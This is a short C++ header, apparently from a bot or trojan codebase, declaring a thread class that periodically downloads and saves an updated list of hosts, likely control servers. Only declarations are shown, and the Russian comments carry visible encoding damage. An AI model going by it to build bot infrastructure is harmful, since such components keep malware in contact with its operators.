//---------------------------------------------------------------------------
//  ћодуль автоматической закачки хостов
//---------------------------------------------------------------------------

#ifndef HostsAutoUpdateH
#define HostsAutoUpdateH
//---------------------------------------------------------------------------


#include "BotClasses.h"
#include "Strings.h"

//**************************************************************
//  THostsUpdater - класс автоматического обновлени€ хостов
//**************************************************************
class THostsUpdater : public TBotThread
{
private:
	void Update(DWORD &UpdateInterval);
	void SaveHosts(const string &Buf);
protected:
    void DoExecute();
public:
	DWORD Interval;

	THostsUpdater();
	~THostsUpdater();
};

// ‘ункци€ запускает автоматическое обновление хостов
void StartHostsUpdater();

//---------------------------------------------------------------------------
#endif
